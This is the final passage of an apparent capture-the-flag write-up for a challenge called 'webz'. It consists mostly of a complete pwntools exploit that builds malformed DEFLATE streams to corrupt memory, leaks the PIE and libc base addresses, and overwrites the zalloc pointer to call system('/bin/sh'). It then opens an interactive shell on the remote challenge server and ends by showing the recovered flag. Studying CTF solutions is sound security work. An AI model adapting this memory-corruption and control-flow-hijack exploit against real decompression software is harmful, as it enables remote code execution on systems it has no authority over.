            <span>if</span> dist_extra_bits <span>&gt;</span> <span>0</span><span>:</span>
                stream<span>.</span>write_bits<span>(</span>dist_extra_val<span>,</span> dist_extra_bits<span>)</span>
        <span>elif</span> <span>type</span> <span>==</span> <span>&#39;INVALID&#39;</span><span>:</span>
            code<span>,</span> length <span>=</span> val
            stream<span>.</span>write_bits<span>(</span>code<span>,</span> length<span>)</span>

<span>def</span> <span>create_exploit_stream</span><span>(</span>stream<span>)</span><span>:</span>
    <span># STORED BLOCK ===============================================================================</span>
    stream<span>.</span>write_bits<span>(</span><span>0</span><span>,</span> <span>1</span><span>)</span> <span># BFINAL</span>
    stream<span>.</span>write_bits<span>(</span><span>0</span><span>,</span> <span>2</span><span>)</span> <span># BTYPE (0 for stored)</span>
    stream<span>.</span>bytebits<span>(</span><span>)</span>
    stored_block_length <span>=</span> <span>0x200</span>
    stream<span>.</span>write_bits<span>(</span>stored_block_length <span>+</span> <span>(</span> <span>(</span>stored_block_length <span>^</span> <span>0xffff</span><span>)</span> <span>&lt;&lt;</span> <span>16</span> <span>)</span><span>,</span> <span>32</span><span>)</span> 
    <span>for</span> i <span>in</span> <span>range</span><span>(</span><span>0</span><span>,</span> stored_block_length<span>)</span><span>:</span>
        stream<span>.</span>write_bits<span>(</span><span>ord</span><span>(</span><span>&#39;X&#39;</span><span>)</span><span>,</span> <span>8</span><span>)</span>
    <span># STORED BLOCK ===============================================================================</span>

    <span># DYNAMIC BLOCK ==============================================================================</span>
    symbol_stream <span>=</span> <span>[</span> <span>(</span><span>&#39;EOB&#39;</span><span>,</span> <span>256</span><span>)</span> <span>]</span>

    ll_lengths <span>=</span> <span>[</span><span>0</span><span>]</span> <span>*</span> <span>286</span>
    ll_lengths<span>[</span><span>256</span><span>]</span> <span>=</span> <span>3</span> <span># EOB</span>

    dist_lengths <span>=</span> <span>[</span><span>0</span><span>]</span> <span>*</span> <span>30</span>
    <span>for</span> i <span>in</span> <span>range</span><span>(</span><span>17</span><span>,</span><span>30</span><span>)</span><span>:</span>
        dist_lengths<span>[</span>i<span>]</span> <span>=</span> <span>15</span>

    create_dynamic_deflate_payload<span>(</span>stream<span>,</span> <span>0</span><span>,</span> symbol_stream<span>,</span> ll_lengths<span>,</span> dist_lengths<span>)</span>
    <span># DYNAMIC BLOCK ==============================================================================</span>

    <span># DYNAMIC BLOCK ==============================================================================</span>
    symbol_stream <span>=</span> <span>[</span><span>]</span>

    symbol_stream<span>.</span>append<span>(</span><span>(</span><span>&#34;INVALID&#34;</span><span>,</span> <span>(</span><span>8</span><span>,</span><span>10</span><span>)</span><span>)</span><span>)</span>
    symbol_stream<span>.</span>append<span>(</span><span>(</span><span>&#34;INVALID&#34;</span><span>,</span> <span>(</span><span>0b1111111</span><span>,</span><span>7</span><span>)</span><span>)</span><span>)</span> <span># extra bits</span>
    symbol_stream<span>.</span>append<span>(</span><span>(</span><span>&#34;INVALID&#34;</span><span>,</span> <span>(</span><span>int</span><span>(</span><span>&#39;000&#39;</span><span>[</span><span>:</span><span>:</span><span>-</span><span>1</span><span>]</span><span>,</span><span>2</span><span>)</span><span>,</span><span>3</span><span>)</span><span>)</span><span>)</span>
    symbol_stream<span>.</span>append<span>(</span><span>(</span><span>&#34;INVALID&#34;</span><span>,</span> <span>(</span><span>0b1111111</span><span>,</span><span>7</span><span>)</span><span>)</span><span>)</span> <span># extra bits</span>
    symbol_stream<span>.</span>append<span>(</span><span>(</span><span>&#39;EOB&#39;</span><span>,</span> <span>256</span><span>)</span><span>)</span>
    ll_lengths <span>=</span> <span>[</span><span>0</span><span>]</span> <span>*</span> <span>286</span>
    ll_lengths<span>[</span><span>256</span><span>]</span> <span>=</span> <span>10</span> <span># EOB</span>
    ll_lengths<span>[</span><span>257</span><span>]</span> <span>=</span> <span>10</span> <span># Length 3</span>
    ll_lengths<span>[</span><span>258</span><span>]</span> <span>=</span> <span>12</span> <span># Length 4</span>

    dist_lengths <span>=</span> <span>[</span><span>0</span><span>]</span> <span>*</span> <span>30</span>
    dist_lengths<span>[</span><span>17</span><span>]</span> <span>=</span> <span>3</span> <span># Distance ???</span>

    create_dynamic_deflate_payload<span>(</span>stream<span>,</span> <span>0</span><span>,</span> symbol_stream<span>,</span> ll_lengths<span>,</span> dist_lengths<span>)</span>
    <span># DYNAMIC BLOCK ==============================================================================</span>

    <span># STORED BLOCK ===============================================================================</span>
    stream<span>.</span>write_bits<span>(</span><span>0</span><span>,</span> <span>5</span><span>)</span> <span># dummy</span>
    stream<span>.</span>write_bits<span>(</span><span>0</span><span>,</span> <span>1</span><span>)</span> <span># BFINAL</span>
    stream<span>.</span>write_bits<span>(</span><span>0</span><span>,</span> <span>2</span><span>)</span> <span># BTYPE (0 for stored)</span>
    stream<span>.</span>bytebits<span>(</span><span>)</span>
    stored_block_length <span>=</span> <span>0x10</span>
    stream<span>.</span>write_bits<span>(</span>stored_block_length <span>+</span> <span>(</span> <span>(</span>stored_block_length <span>^</span> <span>0xffff</span><span>)</span> <span>&lt;&lt;</span> <span>16</span> <span>)</span><span>,</span> <span>32</span><span>)</span> 
    <span>for</span> i <span>in</span> <span>range</span><span>(</span><span>0</span><span>,</span> stored_block_length<span>)</span><span>:</span>
        stream<span>.</span>write_bits<span>(</span><span>ord</span><span>(</span><span>&#39;C&#39;</span><span>)</span><span>,</span> <span>8</span><span>)</span>
    <span># STORED BLOCK ===============================================================================</span>

    <span># DYNAMIC BLOCK ==============================================================================</span>
    symbol_stream <span>=</span> <span>[</span><span>]</span>
    symbol_stream<span>.</span>append<span>(</span><span>(</span><span>&#39;LIT&#39;</span><span>,</span> <span>65</span><span>)</span><span>)</span>
    <span>for</span> i <span>in</span> <span>range</span><span>(</span><span>0</span><span>,</span><span>0x2ce</span><span>)</span><span>:</span>
        symbol_stream<span>.</span>append<span>(</span><span>(</span><span>&#39;LD&#39;</span><span>,</span> <span>(</span><span>10</span><span>,</span> <span>1</span><span>)</span><span>)</span><span>)</span>
    <span>for</span> i <span>in</span> <span>range</span><span>(</span><span>0</span><span>,</span><span>7</span><span>)</span><span>:</span>
        symbol_stream<span>.</span>append<span>(</span><span>(</span><span>&#39;LIT&#39;</span><span>,</span> <span>65</span><span>)</span><span>)</span>
    symbol_stream<span>.</span>append<span>(</span><span>(</span><span>&#39;EOB&#39;</span><span>,</span> <span>256</span><span>)</span><span>)</span>

    ll_lengths <span>=</span> <span>[</span><span>0</span><span>]</span> <span>*</span> <span>286</span>
    ll_lengths<span>[</span><span>65</span><span>]</span> <span>=</span> <span>3</span>  <span># &#39;A&#39;</span>
    ll_lengths<span>[</span><span>256</span><span>]</span> <span>=</span> <span>3</span> <span># EOB</span>
    ll_lengths<span>[</span><span>264</span><span>]</span> <span>=</span> <span>3</span> <span># Length 10</span>

    dist_lengths <span>=</span> <span>[</span><span>0</span><span>]</span> <span>*</span> <span>30</span>
    dist_lengths<span>[</span><span>0</span><span>]</span> <span>=</span> <span>3</span> <span># Distance 1</span>


    create_dynamic_deflate_payload<span>(</span>stream<span>,</span> <span>0</span><span>,</span> symbol_stream<span>,</span> ll_lengths<span>,</span> dist_lengths<span>)</span>
    <span># DYNAMIC BLOCK ==============================================================================</span>

<span>def</span> <span>overwrite_infstream</span><span>(</span>stream<span>,</span> pay<span>)</span><span>:</span>
    <span># STORED BLOCK ===============================================================================</span>
    overwrriten_infstream <span>=</span> pay

    stream<span>.</span>write_bits<span>(</span><span>1</span><span>,</span> <span>1</span><span>)</span> <span># BFINAL</span>
    stream<span>.</span>write_bits<span>(</span><span>0</span><span>,</span> <span>2</span><span>)</span> <span># BTYPE (0 for stored)</span>
    stream<span>.</span>bytebits<span>(</span><span>)</span>
    stored_block_length <span>=</span> <span>len</span><span>(</span>overwrriten_infstream<span>)</span>
    stream<span>.</span>write_bits<span>(</span>stored_block_length <span>+</span> <span>(</span> <span>(</span>stored_block_length <span>^</span> <span>0xffff</span><span>)</span> <span>&lt;&lt;</span> <span>16</span> <span>)</span><span>,</span> <span>32</span><span>)</span> 
    <span>for</span> i <span>in</span> <span>range</span><span>(</span><span>0</span><span>,</span> stored_block_length<span>)</span><span>:</span>
        stream<span>.</span>write_bits<span>(</span>overwrriten_infstream<span>[</span>i<span>]</span><span>,</span> <span>8</span><span>)</span>
    <span># STORED BLOCK =============================================================================</span>

<span>#p = process(&#34;./webz&#34;)</span>
p <span>=</span> remote<span>(</span><span>&#34;webz.2025.ctfcompetition.com&#34;</span><span>,</span> <span>1337</span><span>)</span>

<span># POW =============================================================================</span>
<span>print</span><span>(</span>p<span>.</span>recv<span>(</span><span>1024</span><span>)</span><span>)</span>
answer <span>=</span> <span>raw_input</span><span>(</span><span>)</span>
<span>print</span><span>(</span>answer<span>)</span>
p<span>.</span>sendline<span>(</span>answer<span>)</span>
time<span>.</span>sleep<span>(</span><span>0.5</span><span>)</span>
<span># POW =============================================================================</span>

<span>def</span> <span>send_webz_payload</span><span>(</span>pay<span>)</span><span>:</span>
    NORMAL_AROUND_WIDTH_HEIGHT <span>=</span> p8<span>(</span><span>0x0</span><span>)</span> <span>+</span> p8<span>(</span><span>52</span><span>)</span> <span>+</span> p8<span>(</span><span>0x0</span><span>)</span> <span>+</span> p8<span>(</span><span>5</span><span>)</span>
    p<span>.</span>send<span>(</span>p32<span>(</span><span>len</span><span>(</span>pay<span>)</span><span>+</span><span>12</span><span>)</span><span>)</span>
    p<span>.</span>send<span>(</span><span>b&#34;WEBZ&#34;</span><span>+</span>NORMAL_AROUND_WIDTH_HEIGHT<span>+</span><span>b&#34;\x00\x00\x00\x00&#34;</span><span>+</span>pay<span>)</span>
    time<span>.</span>sleep<span>(</span><span>0.5</span><span>)</span>

<span># Leaking Pie Base By Partial-Overwrite =============================================================================</span>
pay <span>=</span> <span>b&#34;x&#34;</span><span>*</span><span>0x30</span> <span>+</span> p8<span>(</span><span>0x0</span><span>)</span>
stream <span>=</span> BitStream<span>(</span><span>)</span>
create_exploit_stream<span>(</span>stream<span>)</span>
overwrite_infstream<span>(</span>stream<span>,</span> pay<span>)</span>
send_webz_payload<span>(</span>stream<span>.</span>get_bytes<span>(</span><span>)</span><span>)</span>

p<span>.</span>recvuntil<span>(</span><span>b&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span><span>)</span>
pie_base <span>=</span> u64<span>(</span>p<span>.</span>recvn<span>(</span><span>6</span><span>)</span><span>+</span><span>b&#39;\x00\x00&#39;</span><span>)</span> <span>-</span> <span>0x1251b</span>
<span>print</span><span>(</span><span><span>f&#39;pie_base = </span><span><span>{</span><span>hex</span><span>(</span>pie_base<span>)</span><span>}</span></span><span>&#39;</span></span><span>)</span>
<span># Leaking Pie Base By Partial-Overwrite =============================================================================</span>

<span># Leaking Libc Base By AAR =============================================================================</span>
pay <span>=</span> <span>b&#34;x&#34;</span><span>*</span><span>0x30</span> <span>+</span> p64<span>(</span>pie_base<span>+</span><span>0x12000</span><span>)</span> <span># free@got</span>
stream <span>=</span> BitStream<span>(</span><span>)</span>
create_exploit_stream<span>(</span>stream<span>)</span>
overwrite_infstream<span>(</span>stream<span>,</span> pay<span>)</span>
send_webz_payload<span>(</span>stream<span>.</span>get_bytes<span>(</span><span>)</span><span>)</span>

p<span>.</span>recvuntil<span>(</span><span>b&#39;receipt: &#39;</span><span>)</span>
libc_base <span>=</span> u64<span>(</span>p<span>.</span>recvn<span>(</span><span>6</span><span>)</span><span>+</span><span>b&#39;\x00\x00&#39;</span><span>)</span> <span>-</span> <span>0xadd30</span>
<span>print</span><span>(</span><span><span>f&#39;libc_base = </span><span><span>{</span><span>hex</span><span>(</span>libc_base<span>)</span><span>}</span></span><span>&#39;</span></span><span>)</span>
<span># Leaking Libc Base By AAR =============================================================================</span>

<span># Control Flow Hijacking By Overwriting zalloc =============================================================================</span>
system_without_align_issue <span>=</span> libc_base<span>+</span><span>0x582d2</span>
binsh <span>=</span> libc_base<span>+</span><span>0x1cb42f</span>
jmp_to_zfree <span>=</span> pie_base<span>+</span><span>0x44da</span>
dummy_memory <span>=</span> pie_base<span>+</span><span>0x13000</span>
pay <span>=</span> <span>b&#34;\x00&#34;</span><span>*</span><span>0x30</span> <span>+</span> p64<span>(</span>dummy_memory<span>)</span> <span>+</span> p64<span>(</span>dummy_memory<span>)</span> <span>+</span> p64<span>(</span>jmp_to_zfree<span>)</span> <span>+</span> p64<span>(</span>system_without_align_issue<span>)</span> <span>+</span> p64<span>(</span>binsh<span>)</span> <span>*</span> <span>30</span>
stream <span>=</span> BitStream<span>(</span><span>)</span>
create_exploit_stream<span>(</span>stream<span>)</span>
overwrite_infstream<span>(</span>stream<span>,</span> pay<span>)</span>
send_webz_payload<span>(</span>stream<span>.</span>get_bytes<span>(</span><span>)</span><span>)</span>
<span># Control Flow Hijacking By Overwriting zalloc =============================================================================</span>

p<span>.</span>interactive<span>(</span><span>)</span></code></pre>
<p>This is the final exploit. It successfully retrieves the flag.</p>
<p><img src="https://velog.velcdn.com/images/0range1337/post/6b089d5d-fa2f-4b78-b7a0-0c8b4a355c27/image.png"/></p>
<blockquote>
<p><code>CTF{MaybeReadyToTry0clickH1ntEstimateBandwidth}</code></p>
</blockquote></div></div></div></div>
  </body>
</html>
